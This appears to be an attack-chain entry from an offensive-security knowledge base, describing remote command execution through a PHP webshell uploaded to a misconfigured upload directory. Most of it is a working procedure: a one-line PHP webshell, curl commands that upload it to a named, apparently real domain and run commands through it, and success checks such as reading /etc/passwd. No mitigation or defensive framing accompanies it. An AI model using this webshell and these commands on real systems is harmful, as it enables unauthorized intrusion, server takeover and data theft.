---
id: ac-001
tags:
  - rce
  - php
  - file-upload
  - web-server
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Exploit-PHP-Execution-Misconfiguration-for-RCE]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
updated_at: '2025-12-14T05:32:13.750Z'
description: >-
  Exploits web server misconfiguration allowing PHP execution in user-uploaded
  files directory to achieve remote command execution.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---
# Remote Command Execution via Malicious PHP File Upload

Multi-stage attack chain demonstrating a complete attack workflow exploiting PHP execution in user-generated files.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via File Upload] --> B[Execution of Malicious PHP]
    B --> C[Remote Command Execution]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Web browser or [[curl]] for file upload

### Target Environment

- Web platform with PHP-enabled server
- User file upload functionality
- Misconfigured directory allowing PHP execution

### Initial Access Requirements

- Access to the web application upload feature
- No authentication required if upload is public
- Network access to the target server

## Detailed Attack Procedures

### Step 1: Exploit File Upload for RCE
procedure: [[procedures/Exploit-PHP-Execution-Misconfiguration-for-RCE]]

**Objective**: Upload a malicious PHP file to the user-generated directory and execute arbitrary commands on the server.

**Instructions**: Identify the file upload endpoint on the target web application (e.g., insideok.ru). Create a simple PHP webshell, such as a file named shell.php containing `<?php system($_GET['cmd']); ?>`. Upload it using a tool like curl to the vulnerable directory. Once uploaded, access the file via URL and pass commands as parameters to trigger RCE.

First, prepare the PHP shell file:

```bash
# Create shell.php
cat > shell.php << EOF
<?php system(\\$_GET['cmd']); ?>
EOF
```

Then upload it to the target endpoint (assuming a POST upload at /upload.php):

```bash
curl -X POST -F "file=@shell.php" http://insideok.ru/upload.php
```

Access the uploaded file (assuming it's placed in /uploads/shell.php) and execute a command:

```bash
curl "http://insideok.ru/uploads/shell.php?cmd=whoami"
```

**Expected Output**: The upload response confirms file placement, and the execution URL returns the output of the command (e.g., server username).

**Success Indicators**:
- File upload succeeds without errors
- Accessing the PHP file executes the command and returns server response
- Arbitrary commands like id, ls, or cat /etc/passwd produce expected outputs

## Attack Chain Summary

### Key Achievements

1. Successful upload of malicious PHP file to user-generated directory
2. Achievement of remote command execution on the web server
3. Potential for further exploitation like data exfiltration or persistence

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
